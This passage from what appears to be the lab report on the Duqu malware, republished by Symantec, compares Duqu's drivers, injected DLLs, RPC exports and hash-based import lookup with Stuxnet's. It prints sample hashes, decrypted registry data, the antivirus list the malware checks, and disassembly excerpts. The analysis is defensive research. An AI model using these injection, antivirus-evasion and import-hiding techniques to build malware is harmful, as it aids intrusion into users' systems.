organization|\n|3d83b077d32c422d6c7016b5083b9fc2|10/17/2011 20:06|adpu321.sys|Sys file obtained from VirusTotal|\n\n\n-----\n\nAny technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec\nCorporation.\n\nNO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use of the\ntechnical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or typographical\nerrors. Symantec reserves the right to make changes without prior notice.\n\n###### About Symantec Symantec is a global leader in providing security, storage and systems management solutions to\n help businesses and consumers secure and manage their information. Headquartered in Moutain View, Calif.,\n Symantec has operations in more than 40 countries. More information\n is available at www.symantec.com.\n\n\ntechnical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or typographical\nerrors. Symantec reserves the right to make changes without prior notice.\n\n###### About Symantec Symantec is a global leader in providing security, storage and systems management solutions to\n\n\n###### For specific country offices and contact num­ bers, please visit our Web site. For product information in the U.S., call toll-free 1 (800) 745 6054.\n\n\n###### Symantec Corporation\n World Headquarters\n 350 Ellis Street Mountain View, CA 94043 USA\n +1 (650) 527-8000 www.symantec.com\n\n\nCopyright © 2011 Symantec Corporation. All rights reserved.\nSymantec and the Symantec logo are trademarks or registered\n\ntrademarks of Symantec Corporation or its affiliates in the\nU.S. and other countries. Other names may be trademarks of\n\ntheir respective owners.\n\n\n-----\n\n###### The following is the analysis report from the research lab that first discovered the W32.Duqu samples.\n\n## 1. Introduction\n\n###### Stuxnet is the most interesting piece of malware in the last few years, analyzed by hundreds of security experts and the story told by thousands of newspapers. The main reason behind the significant visibility is the targeted attack against the high profile, real‐life, industrial target, which was considered as a thought experiment before. Experts have hypothesized about the possibility of such a sophisticated attack, but Stuxnet rang the bell for a wider audience about the impact of cyber attacks on critical infrastructures.\n\n Surprisingly, the technical novelty of the individual components of the Stuxnet worm is not astonishing. What is more interesting is the way how those different parts are combined with each other to result in a powerful targeted threat against control systems used in nuclear facilities. In fact, Stuxnet is highly modular, and this feature allows sophisticated attackers to build a targeted attack from various pieces of code, similar to the way carmakers build new cars from available parts. This modularity also means a new era for malware developers, with a new business model pointing towards distributed labor where  malware developers can work simultaneously on different parts of the system, and modules can be sold on underground markets.\n\n In this document, we reveal the existence of and report about a malware found in the wild that shows striking similarities to Stuxnet, including its modular structure, injection mechanisms, and a driver that is digitally signed with a compromised key. We named the malware “Duqu” as it’s key logger creates temporary files with names starting with “~DQ…”. \n\n As researchers, we are generally concerned with understanding the impact of the malware and designing appropriate defense mechanisms. This report makes the first steps towards this goal. We describe the results of our initial analysis of Duqu, pointing out many similarities to Stuxnet. We must note, however, that due to the limited available time for preparing this report, many questions and issues remain unanswered or unaddressed. Nevertheless, we hope that our report will still be useful for other security experts who continue the analysis of Duqu. To help follow‐up activities, we discuss open questions at the end of this document. \n\n As a more general impact, we expect that this report will open a new chapter in the story of Stuxnet. Duqu is not Stuxnet, but its structure and design philosophy are very similar to those of Stuxnet. At this point in time, we do not know more about their relationship, but we believe that the creator of Duqu had access to the source code of Stuxnet.   \n\n 1 The content on this page has not been written by Symantec, \n\n\n-----\n\n## 2. Main components \n\n###### Upon discovering the suspicious software, we performed an initial analysis, and uncovered three main groups of components in the software: A standalone keylogger tool, the “Jminet7” group of objects, and the “cmi4432” group of objects as shown in Figure 1.\n\n\n###### cmi4432_ 203627 (exe?) (comm module)\n\n\n###### Registry data\n\n\n###### netp192.pnf\n (config)\n\n\n###### netp191.pnf\n (payload)\n\n\n###### netp191.zdata. mz\n\n\n###### cmi4464.pnf\n (config)\n\n\n###### cmi4432.sys\n (loader)\n\n\n###### Figure 1 – Main components and their modules.\n\n\n###### Keylogger\n\n\n###### internal DLL\n (keylogger)\n\n\n###### cmi4432_ res302.dll\n\n\n###### cmi4432.pnf\n (payload)\n\n\n###### The keylogger is a standalone .exe file that was found on an infected computer. It contains an internal encrypted DLL, which delivers the keylogging functions, whereas the main keylogger executable injects the DLL and controls the keylogging (screen logging, etc.) process.\n\n 2 The content on this page has not been written by Symantec, \n\n\n###### Registry data\n\n\n###### jminet7.sys\n (loader)\n\n\n-----\n\n###### The jminet7 group of objects is working as follows: In the registry, a service is defined that loads the jminet7.sys driver during the Windows bootup process. This kernel driver then loads configuration data from itself and from the registry, and injects the netp191.pnf DLL payload into a system process. Finally, some configuration data is stored in the netp192.pnf encrypted configuration file.\n\n The cmi4432 group of objects exhibits the same behavior: In the registry, a service is defined that loads the cmi4432.sys driver during the Windows bootup process. This kernel driver then loads configuration data from itself and from the registry, and injects the cmi4432.pnf DLL payload into a system process. Finally, some configuration data is stored in the cmi4464.pnf encrypted configuration file.\n\n The jminet7 and the cmi4432 groups are very similar; they only differ in their payload. The difference is tens of kilobytes in size. Also, the cmi4432.sys driver is signed and therefore can be used e.g. on Windows 7 computers. It is not yet fully known if the two groups are designed for different computer types or they can be used simultaneously. It is possible that the rootkit (jminet7 or cmi4432) provides functionality to install and start the keylogger.\n\n The similarities to the Stuxnet malware group start to show up first at this very abstract module level. In case of Stuxnet, a service is defined in the registry that loads the mrxcls.sys driver during the Windows bootup process. This kernel driver then loads configuration data from itself (encrypted in the .sys file) and from the registry; and injects (among others) the oem7a.pnf DLL payload into a system process. Finally, some configuration data is stored in the mdmcpq3dd.pnf encrypted configuration file. This initial similarity motivated us to perform a thorough analysis of the malware code. Our analysis uncovered similarities that show a close relationship between the two malware groups.\n\n We emphasize that there were only two known cases so far in which a malware used a kernel driver with a valid digital signature: Stuxnet’s mrxcls.sys was signed by the key of RealTek, and after the revocation of RealTek’s certificate, a new version contained the signature of JMicron. Now, this list has a new member: cmi4432.sys contains a valid digital signature of the Taiwanese manufacturer XXXXX.\n C-Media\n\n 3 The content on this page has not been written by Symantec, \n\n\n-----\n\n#### 2.1. Comparison of Stuxnet and Duqu at a glance\n\n###### Feature Stuxnet  Duqu \n\n Modular malware � �\n Kernel driver based rootkit  � � very similar Valid digital signature on driver Realtek, JMicron XXXXX C-Media Injection based on A/V list � � seems based on Stux. Imports based on checksum � � different alg. 3 Config files, all encrypted, etc. � � almost the same Keylogger module ? �\n PLC functionality � � (different goal) Infection through local shares � No proof, but seems so Exploits � ? 0‐day exploits � ? DLL injection to system processes � �\n DLL with modules as resources � (many) � (one) RPC communication � �\n RPC control in LAN � ? RPC Based C&C � ? Port 80/443, TLS based C&C  ? �\n Special “magic” keys, e.g. 790522, AE � � lots of similar Virtual file based access to modules � �\n Usage of LZO lib ? � multiple Visual C++ payload � �\n UPX compressed payload, � �\n Careful error handling � �\n Deactivation timer � �\n Initial Delay ? Some � 15 mins Configurable starting in safe mode/dbg � � (exactly same mech.) Table 1 – Comparing Duqu and Stuxnet at the first glance\n\n 4 The content on this page has not been written by Symantec, \n\n|Feature|Stuxnet|Duqu|\n|---|---|---|\n|Modular malware|9|9|\n|Kernel driver based rootkit|9|9 very similar|\n|Valid digital signature on driver|Realtek, JMicron|C-Media XXXXX|\n|Injection based on A/V list|9|9 seems based on Stux.|\n|Imports based on checksum|9|9 different alg.|\n|3 Config files, all encrypted, etc.|9|9 almost the same|\n|Keylogger module|?|9|\n|PLC functionality|9|8 (different goal)|\n|Infection through local shares|9|No proof, but seems so|\n|Exploits|9|?|\n|0‐day exploits|9|?|\n|DLL injection to system processes|9|9|\n|DLL with modules as resources|9 (many)|9 (one)|\n|RPC communication|9|9|\n|RPC control in LAN|9|?|\n|RPC Based C&C|9|?|\n|Port 80/443, TLS based C&C|?|9|\n|Special “magic” keys, e.g. 790522, AE|9|9 lots of similar|\n|Virtual file based access to modules|9|9|\n|Usage of LZO lib|?|9 multiple|\n|Visual C++ payload|9|9|\n|UPX compressed payload,|9|9|\n|Careful error handling|9|9|\n|Deactivation timer|9|9|\n|Initial Delay|? Some|9 15 mins|\n|Configurable starting in safe mode/dbg|9|9 (exactly same mech.)|\n\n\n-----\n\n|Feature|oam7a.pnf (Stuxnet)|netp191.pnf (Duqu)|\n|---|---|---|\n|Packer|UPX|UPX|\n|Size|1233920 bytes|384512 bytes|\n|Exported functions #|21|8|\n|ntdll.dll hooks|ZwMapViewOfSection ZwCreateSection ZwOpenFile ZwClose ZwQueryAttributesFile ZwQuerySection|ZwMapViewOfSection ZwCreateSection ZwOpenFile ZwClose ZwQueryAttributesFile ZwQuerySection|\n|Resources|13 (201, 202, 203,205, 208, 209, 210, 220, 221,222, 240,241,242, 250)|1 (302)|\n\n\n###### Table 2 – Similarities and differences between the two main dlls\n\n Table 1 and Table 2 compare the features of Stuxnet and Duqu. From the comparison, the strong similarity between the threats becomes apparent. When we dive into the details of the codes, we even see that both malwares hook the same ntddl.dll functions. Furthermore, the sections of the two dlls are also very similar as Stuxnet contains only one extra section called .xdata (Figure 3), but its characteristics are the same as the .rdata section of Duqu (Figure 2).\n\n Figure 2 – The sections of Duqu’s netp191 dll\n\n 5 The content on this page has not been written by Symantec, \n\n\n-----\n\n###### Figure 3 – The sections of Stuxnet’s oem7a dll\n\n There are also differences between the two codes. The main dll of Stuxnet (oam7a.pnf) contains 21 exported functions (with dedicated roles), but netp191.pnf has only 8 exported functions. The smaller number of functions is justified by the fact that Duqu does not contain the power plant specific functionalities that Stuxnet does. However, the rest of this report demonstrates that Duqu uses the mechanisms of Stuxnet via these functions.\n\n 6 The content on this page has not been written by Symantec, \n\n\n-----\n\n#### 2.2. Comparison of Duqu’s two main group of objects\n\n###### File Compiler/Packer Description\n\n Kernel driver, loader of other jminet7.sys components\n\n nep191.pnf UPX Injected DLL payload\n\n nep191_res302.dll\n MS VC++ Private Version 1 Internal part, ???\n (offset 175192) [Overlay]\n\n Compressed file (dll) in ??? (likely res302+comm. netp191.zdata.mz unknown format module)\n\n Kernel driver, loader of other cmi4432.sys components\n\n Injected DLL payload cmi4432.pnf UPX\n\n Most likely, loader for the\n cmi4432_res302.dll\n MS VC++ Private Version 1\n comm. module\n (offset 203627) [Overlay]\n\n cmi4432_ Communication module 203627.dll\n\n Table 3 – Comparing the two main group of objects\n\n Table 3 summarizes a few pieces of information about the two main groups of objects we identified in Duqu. \n\n 7 The content on this page has not been written by Symantec, \n\n|File|Compiler/Packer|Description|\n|---|---|---|\n|jminet7.sys||Kernel driver, loader of other components|\n|nep191.pnf|UPX|Injected DLL payload|\n|nep191_res302.dll (offset 175192)|MS VC++ Private Version 1 [Overlay]|Internal part, ???|\n|netp191.zdata.mz|Compressed file (dll) in unknown format|??? (likely res302+comm. module)|\n|cmi4432.sys||Kernel driver, loader of other components|\n|cmi4432.pnf|UPX|Injected DLL payload|\n|cmi4432_res302.dll (offset 203627)|MS VC++ Private Version 1 [Overlay]|Most likely, loader for the comm. module|\n|cmi4432_ 203627.dll||Communication module|\n\n\n-----\n\n#### 2.3. PE file dates\n\n###### File Date\n\n CMI4432.PNF 17/07/2011 06:12:41\n\n cmi4432_res302.dll 21/12/2010 08:41:03\n\n cmi4432_203627.dll 21/12/2010 08:41:29\n\n netp191.PNF 04/11/2010 16:48:28\n\n nep191_res302.dll 21/12/2010 08:41:03\n\n Keylogger.exe 01/06/2011 02:25:18\n\n Keylogger internal DLL 01/06/2011 02:25:16\n\n Table 4 – Comparing dates of Duqu’s PE files\n\n Table 4 shows the dates of Duqu’s each PE file. \n\n#### 2.4. Directory listing and hashes\n\n###### The size, date and SHA1 sum of Duqu’s PE files are shown below.\n\n 192512 Sep 9 14.48 cmi4432.PNF  29568 Sep 9 15.20 cmi4432.sys  6750 Sep 9 14.48 cmi4464.PNF  24960 2008 Apr 14 jminet7.sys  85504 Aug 23 06.44 keylogger.ex 232448 2009 Feb 10 netp191.PNF  6750 2009 Feb 10 netp192.PNF\n\n Sample 1 – File size, date and name – Directory listing of samples\n\n 192f3f7c40fa3aaa4978ebd312d96447e881a473 *cmi4432.PNF 588476196941262b93257fd89dd650ae97736d4d *cmi4432.sys f8f116901ede1ef59c05517381a3e55496b66485 *cmi4464.PNF d17c6a9ed7299a8a55cd962bdb8a5a974d0cb660 *jminet7.sys 723c71bd7a6c1a02fa6df337c926410d0219103a *keylogger.ex\n\n 8 The content on this page has not been written by Symantec, \n\n|2.3. PE file dates|Col2|\n|---|---|\n|File|Date|\n|CMI4432.PNF|17/07/2011 06:12:41|\n|cmi4432_res302.dll|21/12/2010 08:41:03|\n|cmi4432_203627.dll|21/12/2010 08:41:29|\n|netp191.PNF|04/11/2010 16:48:28|\n|nep191_res302.dll|21/12/2010 08:41:03|\n|Keylogger.exe|01/06/2011 02:25:18|\n|Keylogger internal DLL|01/06/2011 02:25:16|\n\n\n-----\n\n###### 3ef572cd2b3886e92d1883e53d7c8f7c1c89a4b4 *netp191.PNF c4e51498693cebf6d0cf22105f30bc104370b583 *netp192.PNF\n\n Sample 2 – sha1sum results for the samples\n\n 9 The content on this page has not been written by Symantec, \n\n\n-----\n\n## 3. Injection mechanism\n\n###### The registry information for Duqu’s jminet7.sys in unencrypted form is presented below:\n\n0000000000: 00 00 00 00 01 00 00 00 │ 10 BB 00 00 01 00 03 00   ☺ `►» ☺` `♥`\n0000000010: 82 06 24 AE 1A 00 00 00 │ 73 00 65 00 72 00 76 00 '♠$R→  s e r v\n0000000020: 69 00 63 00 65 00 73 00 │ 2E 00 65 00 78 00 65 00 i c e s . e x e\n0000000030: 00 00 38 00 00 00 5C 00 │ 53 00 79 00 73 00 74 00  8  \\ S y s t\n0000000040: 65 00 6D 00 52 00 6F 00 │ 6F 00 74 00 5C 00 69 00 e m R o o t \\ i\n0000000050: 6E 00 66 00 5C 00 6E 00 │ 65 00 74 00 70 00 31 00 n f \\ n e t p 1\n0000000060: 39 00 31 00 2E 00 50 00 │ 4E 00 46 00 00 00 D2   9 1 . P N F  Ň\n\n###### Sample 3 – decrypted registry data for Duqu’s jminet7.sys\n\n Knowing the operation of Stuxnet from previous analyses, visual inspection of the code hints to the injection of “inf/netp191.PNF” into “services.exe”. Later, we will show that it also commands that the encryption key of “0xAE240682” (offset 0x10) is used. The byte sequence “1A 00 00 00” that follows the encryption key can also be found in the Stuxnet registry. The only difference is that in Stuxnet the export that should be called is between the key and the “1A 00 00 00” string, here it is before “01 00 03 00”. So after injection, Export 1 should be called by the driver. The case of cmi4432.sys is the same, it is injected into “services.exe” and then Export 1 is called.\n\n## 4. Injection target\n\n###### Duqu injection target selection is very similar to the mechanism of Stuxnet. For trusted processes both look up a list of known antivirus products. In Duqu, this list is stored in 0xb3 0x1f XOR encrypted 0‐terminated strings. In the Resource 302 part of the cmi4432 payload DLL the list is the following:\n\n %A\\Kaspersky Lab\\AVP%v\\Bases\\*.*c Mcshield.exe SOFTWARE\\KasperskyLab\\protected\\AVP80\\environment SOFTWARE\\KasperskyLab\\protected\\AVP11\\environment SOFTWARE\\KasperskyLab\\protected\\AVP10\\environment SOFTWARE\\KasperskyLab\\protected\\AVP9\\environment SOFTWARE\\KasperskyLab\\protected\\AVP8\\environment SOFTWARE\\KasperskyLab\\protected\\AVP7\\environment SOFTWARE\\kasperskylab\\avp7\\environment SOFTWARE\\kasperskylab\\avp6\\environment ProductRoot avp.exe %C\\McAfee\\Engine\\*.dat SOFTWARE\\McAfee\\VSCore szInstallDir32\n\n 10 The content on this page has not been written by Symantec, \n\n\n-----\n\n###### avguard.exe bdagent.exe UmxCfg.exe fsdfwd.exe %C\\Symantec Shared\\VirusDefs\\binhub\\*.dat rtvscan.exe ccSvcHst.exe ekrn.exe %A\\ESET\\ESET Smart Security\\Updfiles\\*.nup SOFTWARE\\TrendMicro\\NSC\\TmProxy InstallPath tmproxy.exe SOFTWARE\\Rising\\RIS SOFTWARE\\Rising\\RAV RavMonD.exe\n\n Sample 4 – Duqu’s antivirus list (trusted processes) from cmi4432 res302 DLL\n\n Basically, the list above is almost identical to the one in Stuxnet (even uses the same ordering), the only difference is the addition of Rising Antivirus.\n\n The outer part, cmi4432.dll contains some addition this list:\n\n %A\\Kaspersky Lab\\AVP%v\\Bases\\*.*c Mcshield.exe SOFTWARE\\KasperskyLab\\protected\\AVP80\\environment SOFTWARE\\KasperskyLab\\protected\\AVP11\\environment SOFTWARE\\KasperskyLab\\protected\\AVP10\\environment SOFTWARE\\KasperskyLab\\protected\\AVP9\\environment SOFTWARE\\KasperskyLab\\protected\\AVP8\\environment SOFTWARE\\KasperskyLab\\protected\\AVP7\\environment SOFTWARE\\kasperskylab\\avp7\\environment SOFTWARE\\kasperskylab\\avp6\\environment ProductRoot avp.exe %C\\McAfee\\Engine\\*.dat SOFTWARE\\McAfee\\VSCore szInstallDir32 avguard.exe bdagent.exe UmxCfg.exe fsdfwd.exe %C\\Symantec Shared\\VirusDefs\\binhub\\*.dat rtvscan.exe ccSvcHst.exe ekrn.exe %A\\ESET\\ESET Smart Security\\Updfiles\\*.nup SOFTWARE\\TrendMicro\\NSC\\TmProxy InstallPath tmproxy.exe SOFTWARE\\Rising\\RIS SOFTWARE\\Rising\\RAV RavMonD.exe 360rp.exe 360sd.exe\n\n Sample 5 – Antivirus list of cmi4432\n\n 11 The content on this page has not been written by Symantec, \n\n\n-----\n\n###### 360rp.exe and 360sd.exe is added.\n\n For netp191.PNF (DLL), both the external and the internal DLL contains only the first list of antivirus products without 360rp.exe and 360sd.exe. The keylogger also contains the same list including 360rp.exe and 360sd.exe.\n\n %SystemRoot%\\system32\\lsass.exe %SystemRoot%\\system32\\winlogon.exe %SystemRoot%\\system32\\svchost.exe\n\n Sample 6 – possible targets ‐ in our case lsass.exe was used.\n\n The evolution of the list items corresponds to the file dates in the MZ headers. All the exectuables whose header the year 2011 contain 360rp.exe and 360sd.exe (the earliest example is the keylogger.exe with date 01/06/2011 02:25:18), while earlier components do not contain 360rp.exe and 360sd.exe. \n\n1 - Start RPC through a thread\n2 - Run export number 6\n3 - Get the version information from the configuration data\n4 - Run export 5 (if and only if it is running on a 32bit platform)\n5 - Load the resource 302 DLL (resource 302 is a loader for the main payload)\n6 - Cleanup routine\n\n## 5. Exported functions\n\n7 - Start the RPC component\n8 - The same as export number 1\n\n###### Figure 4 and Figure 5 show the exported functions of netp191.pnf and cmi4432.pnf, respectively. While netp191.pnf contains 8 exports, cmi4432 lacks export number _3 and _7.  Each export has a specific role with similarities to the exports of Stuxnet’s main dll.\n\n We could not yet identify the function of each export, except exports 1, 7, and 8, which are responsible for RPC functions. Below, we describe our findings related to RPC. \n\n First, exports _1 and _8 of netp191.pnf are essentially the same as the first (_1) and the last (_32) exports of Stuxnet’s oam7a.pnf. In case of Stuxnet, these exports served to infect removable devices and started an RPC server to communicate with other instances of the malware. The only difference was that _1 started the RPC server with wait, while _32 did not sleep before the start of the RPC server. In case of netp191.pnf, export _1 and export_8 are also related to RPC communication and differ only in a few bits. \n\n Figure 4 – The exports of netp191.pnf\n\n 12 The content on this page has not been written by Symantec, \n\n\n-----\n\n###### Figure 5 – The exports of cmi4432.pnf\n\n Export _7 of netp191.pnf is almost the same as the RPC server export _27 in Stuxnet. Thus, we can assert that Duqu might have the same functionality to update itself from another Duqu instance or from the C&C server. The main similarities between the two RPC server initializations are highlighted in Sample 7 (Duqu) and Sample 8 (Stuxnet) . Note that there is a slight mutation between the two samples, but despite of this, the implemented functionalities are the same. \n\n.text:100011A3         public RPC_Server_7\n.text:100011A3 RPC_Server_7  proc near        ; DATA XREF: .rdata:off_1001C308�o\n.text:100011A3         mov   eax, offset sub_1001B756\n.text:100011A8         call  Nothing_sub_10018C14\n.text:100011AD         sub   esp, 10h\n.text:100011B0         push  ebx\n.text:100011B1         push  esi\n.text:100011B2         push  edi\n.text:100011B3         mov   [ebp-10h], esp\n.text:100011B6         and   dword ptr [ebp-4], 0\n.text:100011BA         lea   esi, [ebp-18h]\n.text:100011BD         call  sub_10008CBD\n.text:100011C2         xor   ebx, ebx\n.text:100011C4         inc   ebx\n.text:100011C5         mov   [ebp-4], bl\n.text:100011C8         call  sub_10008D9B\n.text:100011CD         call  sub_1000778F\n.text:100011D2         test  al, al\n.text:100011D4         jnz   short loc_100011F2\n.text:100011D6         mov   [ebp-4], al\n.text:100011D9         mov   eax, esi\n.text:100011DB         push  eax\n.text:100011DC         call  each_export_calls_sub_10008CCD\n.text:100011E1\n.text:100011E1 loc_100011E1:              ; DATA XREF: sub_1000122C+4�o\n.text:100011E1         xor   eax, eax\n.text:100011E3         mov   ecx, [ebp-0Ch]\n.text:100011E6         mov   large fs:0, ecx\n.text:100011ED         pop   edi\n.text:100011EE         pop   esi\n.text:100011EF         pop   ebx\n.text:100011F0         leave\n.text:100011F1         retn\n.text:100011F2 ; --------------------------------------------------------------------------.text:100011F2\n.text:100011F2 loc_100011F2:              ; CODE XREF: RPC_Server_7+31�j\n.text:100011F2         call  sub_10006C53\n.text:100011F7         lea   eax, [ebp-11h]\n.text:100011FA         push  eax\n.text:100011FB         call  sub_10001318\n.text:10001200         mov   eax, dword_1002A134\n.text:10001205         cmp   dword ptr [eax], 0\n.text:10001208         jnz   short loc_1000121B\n.text:1000120A         mov   [ebp-1Ch], ebx\n.text:1000120D         push  offset unk_1001FC18\n.text:10001212         lea   eax, [ebp-1Ch]\n.text:10001215         push  eax\n.text:10001216         call  Exception_Handler_sub_10013880\n\n###### 13 The content on this page has not been written by Symantec, \n\n\n-----\n\n.text:1000121B\n.text:1000121B loc_1000121B:              ; CODE XREF: RPC_Server_7+65�j\n.text:1000121B         mov   eax, [eax]\n.text:1000121D         mov   edx, [eax]\n.text:1000121F         mov   ecx, eax\n.text:10001221         call  dword ptr [edx+8]\n.text:10001224         push  ebx       ; dwExitCode\n.text:10001225         push  eax       ; hLibModule\n.text:10001226         call  ds:FreeLibraryAndExitThread\n.text:10001226 RPC_Server_7  endp\n\n###### Sample 7 – Export function _7 in netp191.pnf\n\n.text:10001CA2         public _27_RPCServer\n.text:10001CA2 _27_RPCServer  proc near        ; DATA XREF: .rdata:off_10055518�o\n.text:10001CA2         mov   eax, offset loc_10052604\n.text:10001CA7         call  Nothing_sub_1004AB94\n.text:10001CAC         sub   esp, 0Ch\n.text:10001CAF         push  ebx\n.text:10001CB0         push  esi\n.text:10001CB1         push  edi\n.text:10001CB2         mov   [ebp-10h], esp\n.text:10001CB5         and   dword ptr [ebp-4], 0\n.text:10001CB9         lea   esi, [ebp-18h]\n.text:10001CBC         call  sub_1002214A\n.text:10001CC1         mov   byte ptr [ebp-4], 1\n.text:10001CC5         call  sub_10022228\n.text:10001CCA         push  2\n.text:10001CCC         push  offset dword_1005CCF0\n.text:10001CD1         call  sub_100226BB\n.text:10001CD6         pop   ecx\n.text:10001CD7         pop   ecx\n.text:10001CD8         call  sub_100319D2\n.text:10001CDD         test  al, al\n.text:10001CDF         jnz   short loc_10001CFD\n.text:10001CE1         mov   [ebp-4], al\n.text:10001CE4         mov   eax, esi\n.text:10001CE6         push  eax\n.text:10001CE7         call  each_export_calls_1002215A\n.text:10001CEC\n.text:10001CEC loc_10001CEC:              ; DATA XREF: sub_10001D1E+12�o\n.text:10001CEC         xor   eax, eax\n.text:10001CEE         mov   ecx, [ebp-0Ch]\n.text:10001CF1         mov   large fs:0, ecx\n.text:10001CF8         pop   edi\n.text:10001CF9         pop   esi\n.text:10001CFA         pop   ebx\n.text:10001CFB         leave\n.text:10001CFC         retn\n.text:10001CFD ; --------------------------------------------------------------------------.text:10001CFD\n.text:10001CFD loc_10001CFD:              ; CODE XREF: _27_RPCServer+3D�j\n.text:10001CFD         call  sub_100193EA\n.text:10001D02         lea   eax, [ebp-11h]\n.text:10001D05         push  eax\n.text:10001D06         call  sub_10001E2D\n.text:10001D0B         push  1        ; dwExitCode\n.text:10001D0D         mov   eax, dword_1006A840\n.text:10001D12         call  sub_10022379\n.text:10001D17         push  eax       ; hLibModule\n.text:10001D18         call  ds:FreeLibraryAndExitThread\n.text:10001D18 _27_RPCServer  endp\n\n###### Sample 8 – Export function _27 in oam7a.pnf (Stuxnet)\n\n 14 The content on this page has not been written by Symantec, \n\n\n-----\n\n###### Figure 6 – Cross references to library function RPCServerUnregisterIf in oam7a.pnf\n\n 15 The content on this page has not been written by Symantec, \n\n\n-----\n\n###### Figure 7 – Cross references to library function RPCServerUnregisterIf in netp191.pnf\n\n Figure 6 and Figure 7 show the cross‐reference graph to the library function RpcServerUnregisterIf. An obvious similarity between the two control flows is that in both cases RpcServerUnregisterIf has two ingress edges, RPCStopServerListening_... and CallRPCUnregisterIF_…. Furthermore, the number of function calls from the RPC server export functions to the examined library function is three via CallRPCUnregisterIF_… Furthermore, we identified that Duqu uses the same type of bindings as Stuxnet (see Sample 9 and Sample 10 for details). \n\n.text:10006FB8         push  ebp\n.text:10006FB9         mov   ebp, esp\n.text:10006FBB         and   esp, 0FFFFFFF8h\n.text:10006FBE         push  offset aRpcss  ; \"rpcss\"\n.text:10006FC3         call  sub_10006FE0\n.text:10006FC8         push  offset aNetsvcs ; \"netsvcs\"\n\n###### 16 The content on this page has not been written by Symantec, \n\n\n-----\n\n.text:10006FCD         call  sub_10006FE0\n.text:10006FD2         push  offset aBrowser ; \"browser\"\n.text:10006FD7         call  sub_10006FE0\n.text:10006FDC         mov   esp, ebp\n.text:10006FDE         pop   ebp\n.text:10006FDF         retn\n\n###### Sample 9 – Duqu calls the RPC functions via three bindings, similarly to Stuxnet\n\n.text:100197F1         push  ebp\n.text:100197F2         mov   ebp, esp\n.text:100197F4         and   esp, 0FFFFFFF8h\n.text:100197F7         push  offset aRpcss  ; \"rpcss\"\n.text:100197FC         call  sub_10019819\n.text:10019801         push  offset aNetsvcs ; \"netsvcs\"\n.text:10019806         call  sub_10019819\n.text:1001980B         push  offset aBrowser ; \"browser\"\n.text:10019810         call  sub_10019819\n.text:10019815         mov   esp, ebp\n.text:10019817         pop   ebp\n.text:10019818         retn\n\n###### Sample 10 – Stuxnet calls the RPC functions via three bindings\n\n We also found many other correlations (e.g., the impersonation of anonymous tokens) between the two RPC mechanisms. As a consequence, we conclude that Duqu uses the same (or very similar) RPC logic as Stuxnet to update itself.\n\n Unfortunately, we still could not dissect the exact mechanism of the remaining exports of Duqu, but we suspect that they implement the same functionalities as the corresponding exports of Stuxnet. \n\n 17 The content on this page has not been written by Symantec, \n\n\n-----\n\n## 6. Import preparation by hashes/checksums\n\n###### Both Stuxnet and Duqu uses the trick that some exports are prepared by looking up checksums/hashes in particular DLL‐s and comparing the results instead of directly naming the specific function (more info in case of Stuxnet driver is available in [ThabetMrxCls] Chapter 3‐4.)\n\ntext:10001C41         push  edi\n.text:10001C42         push  790E4013h    ; GetKernelObjectSecurity\n.text:10001C47         mov   [ebp+var_24], eax\n.text:10001C4A         mov   [ebp+var_34], eax\n.text:10001C4D         call  searchin_dll2_100022C7\n.text:10001C52         mov   edi, eax\n.text:10001C54         mov   [esp+10h+var_10], 0E876E6Eh ; GetSecurityDescriptorDacl\n.text:10001C5B         call  searchin_dll2_100022C7\n.text:10001C60         push  0E1BD5137h   ; BuildExplicitAccessWithNameW\n.text:10001C65         mov   [ebp+var_C], eax\n.text:10001C68         call  searchin_dll2_100022C7\n.text:10001C6D         push  2F03FA6Fh    ; SetEntriesInAclW\n.text:10001C72         mov   ebx, eax\n.text:10001C74         call  searchin_dll2_100022C7\n.text:10001C79         push  0C69CF599h   ; MakeAbsoluteSD\n.text:10001C7E         mov   [ebp+var_4], eax\n.text:10001C81         call  searchin_dll2_100022C7\n.text:10001C86         push  0CE8CAD1Ah   ; SetSecurityDescriptorDacl\n.text:10001C8B         mov   [ebp+var_8], eax\n.text:10001C8E         call  searchin_dll2_100022C7\n.text:10001C93         push  9A71C67h    ; SetKernelObjectSecurity\n.text:10001C98         mov   [ebp+var_10], eax\n.text:10001C9B         call  searchin_dll2_100022C7\n\n.text:10002565         call  sub_1000211F\n.text:1000256A         mov   ecx, [ebp+var_4]\n.text:1000256D         mov   [ecx], eax\n.text:1000256F         push  4BBFABB8h    ; lstrcmpiW\n.text:10002574         call  searchin_dll1_100022B6\n.text:10002579         pop   ecx\n.text:1000257A         mov   ecx, [ebp+var_4]\n.text:1000257D         mov   [ecx+8], eax\n.text:10002580         push  0A668559Eh   ; VirtualQuery\n.text:10002585         call  searchin_dll1_100022B6\n.text:1000258A         pop   ecx\n.text:1000258B         mov   ecx, [ebp+var_4]\n.text:1000258E         mov   [ecx+0Ch], eax\n.text:10002591         push  4761BB27h    ; VirtualProtect\n.text:10002596         call  searchin_dll1_100022B6\n.text:1000259B         pop   ecx\n.text:1000259C         mov   ecx, [ebp+var_4]\n.text:1000259F         mov   [ecx+10h], eax\n.text:100025A2         push  0D3E360E9h   ; GetProcAddress\n.text:100025A7         call  searchin_dll1_100022B6\n.text:100025AC         pop   ecx\n.text:100025AD         mov   ecx, [ebp+var_4]\n.text:100025B0         mov   [ecx+14h], eax\n.text:100025B3         push  6B3749B3h    ; MapViewOfFile\n.text:100025B8         call  searchin_dll1_100022B6\n.text:100025BD         pop   ecx\n.text:100025BE         mov   ecx, [ebp+var_4]\n.text:100025C1         mov   [ecx+18h], eax\n.text:100025C4         push  0D830E518h   ; UnmapViewOfFile\n.text:100025C9         call  searchin_dll1_100022B6\n.text:100025CE         pop   ecx\n.text:100025CF         mov   ecx, [ebp+var_4]\n.text:100025D2         mov   [ecx+1Ch], eax\n\n###### 18 The content on this page has not been written by Symantec, \n\n\n-----\n\n.text:100025D5         push  78C93963h    ; FlushInstructionCache\n.text:100025DA         call  searchin_dll1_100022B6\n.text:100025DF         pop   ecx\n.text:100025E0         mov   ecx, [ebp+var_4]\n.text:100025E3         mov   [ecx+20h], eax\n.text:100025E6         push  0D83E926Dh   ; LoadLibraryW\n.text:100025EB         call  searchin_dll1_100022B6\n.text:100025F0         pop   ecx\n.text:100025F1         mov   ecx, [ebp+var_4]\n.text:100025F4         mov   [ecx+24h], eax\n.text:100025F7         push  19BD1298h    ; 